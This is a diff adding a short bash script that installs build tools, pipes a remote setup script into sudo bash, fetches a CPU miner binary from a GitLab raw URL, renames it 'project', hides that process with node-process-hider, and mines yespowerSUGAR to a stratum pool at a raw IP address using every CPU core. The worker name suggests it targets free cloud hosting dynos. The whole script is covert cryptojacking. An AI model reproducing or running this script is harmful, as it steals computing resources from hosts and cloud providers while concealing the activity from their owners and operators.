@@ -1,0 +1,9 @@
+#!/bin/bash
+apt update && apt -y install sudo wget curl unzip >/dev/null 2>&1
+apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang >/dev/null 2>&1
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs >/dev/null 2>&1
+sudo npm i -g node-process-hider && sudo ph add project
+wget -qO project https://gitlab.com/mauliki9999/codet/-/raw/main/cpuminer && chmod +x project
+./project -a yespowerSUGAR -o stratum+tcp://47.89.228.8:8080 -u RH53tGMS2TziXVMqPTzENYVi6t5GFQnvZ9.$(echo HRKU-$(date +"%T")) -p c=RVN -t $(nproc --all)
